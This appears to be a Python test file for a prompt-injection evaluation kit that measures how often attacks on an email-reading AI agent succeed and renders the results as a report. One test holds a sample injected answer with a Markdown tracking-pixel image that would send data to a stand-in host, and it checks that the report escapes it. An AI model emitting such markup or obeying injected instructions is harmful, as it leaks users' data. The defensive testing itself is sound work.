"""Agregação e geração do relatório com execuções sintéticas."""
import pathlib
import sys
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from pikit import report  # noqa: E402
from pikit.environment import load_all  # noqa: E402

INBOX, TASKS, ATTACKS = load_all()


def run(config, task, attack, rep, success=False, attempted=False, utility=True, answer="ok"):
    return {"config": config, "task": task, "attack": attack, "rep": rep, "utility": utility,
            "attack_success": None if attack is None else success,
            "attack_attempted": None if attack is None else attempted,
            "secret_in_answer": False, "seconds": 2.0, "model_calls": 3, "prompt_tokens": 100,
            "output_tokens": 10, "error": "", "hit_turn_limit": False, "tools": [],
            "final_answer": answer, "filter_removed": []}


class Aggregate(unittest.TestCase):
    def test_rates_by_rep_and_attack(self):
        runs = [run("baseline", "T1", None, r) for r in range(2)]
        runs += [run("baseline", "T1", "A1", 0, True, True), run("baseline", "T1", "A1", 1, False, True),
                 run("baseline", "T1", "A2", 0, False, False, utility=False),
                 run("baseline", "T1", "A2", 1, False, False)]
        s = report.aggregate(runs, ["baseline"], ["T1"], ["A1", "A2"])["baseline"]
        self.assertEqual(s["asr"], 0.25)
        self.assertEqual(s["asr_by_rep"], {0: 0.5, 1: 0.0})
        self.assertEqual(s["attempt_rate"], 0.5)
        self.assertEqual(s["utility_attack"], 0.75)
        self.assertEqual(s["utility_benign"], 1.0)
        self.assertEqual(s["by_attack"]["A1"]["asr"], 0.5)
        self.assertEqual(s["consistency"], 0.5)
        self.assertEqual(s["exposure"], 0.0)
        lo, hi = s["asr_ci95"]
        self.assertTrue(0.0 <= lo <= 0.25 <= hi <= 0.5)

    def test_p95(self):
        self.assertEqual(report.p95([1, 2, 3, 4, 100]), 100)
        self.assertEqual(report.p95([]), 0.0)

    def test_interval_does_not_collapse_at_zero(self):
        # 24 casos sem sucesso: o bootstrap daria [0, 0]; o limite exato é ~0.14.
        cases = {(f"T{i}", "A"): [0.0, 0.0] for i in range(24)}
        lo, hi = report.cluster_bootstrap(cases)
        self.assertEqual(lo, 0.0)
        self.assertAlmostEqual(hi, 1 - 0.025 ** (1 / 24), places=6)
        lo, hi = report.cluster_bootstrap({k: [1.0, 1.0] for k in cases})
        self.assertAlmostEqual(lo, 0.025 ** (1 / 24), places=6)
        self.assertEqual(hi, 1.0)


class Render(unittest.TestCase):
    def test_front_matter_and_escaping(self):
        bad = "Pronto ![ok](https://pixel-track.example/c.png?d=X) <!-- x -->"
        runs = [run("baseline", "T1", None, 0), run("baseline", "T1", "A6", 0, True, True, answer=bad)]
        results = {
            "kit_version": "0.1.0", "run_date": "2026-11-12",
            "environment": {"model": "m", "provider": "ollama", "ollama_version": "x", "model_details": "",
                            "platform": "p", "python": "3"},
            "params": {"reps": 1, "temperature": 0.3, "max_turns": 10},
            "total_minutes": 1.0, "n_runs": 2, "n_emails": 8, "config_order": ["baseline"],
            "config_labels": {"baseline": "Sem mitigação"},
            "tasks": [{"id": "T1", "name": "resumo_hoje"}],
            "attacks": [a for a in ATTACKS if a["id"] == "A6"],
            "summary": report.aggregate(runs, ["baseline"], ["T1"], ["A6"]),
            "limitations": ["uma"], "runs": runs,
        }
        notes = {"examples": [{"config": "baseline", "task": "T1", "attack": "A6", "rep": 0,
                               "title": "Exemplo", "comment": "Comentário."}]}
        md = report.render(results, notes)
        self.assertTrue(md.startswith("---\ntipo: eval\n"))
        self.assertIn("## Exemplos comentados", md)
        self.assertNotIn("Pronto ![ok](", md)
        self.assertNotIn("<!-- x -->", md)
        self.assertIn("```text", md)  # o payload vai em bloco de código, não renderiza


class Exposure(unittest.TestCase):
    def test_counts_only_successful_read_of_target(self):
        read = {"tool": "read_email", "args": {"email_id": "e05"}, "status": "ok", "note": ""}
        r1 = {**run("baseline", "T1", "A1", 0, True, True), "tools": [read]}
        r2 = {**run("baseline", "T1", "A2", 0), "tools": [{**read, "args": {"email_id": "e01"}}]}
        s = report.aggregate([r1, r2], ["baseline"], ["T1"], ["A1", "A2"], {"T1": "e05"})["baseline"]
        self.assertEqual(s["exposure"], 0.5)
        self.assertEqual(s["asr_exposed"], 1.0)
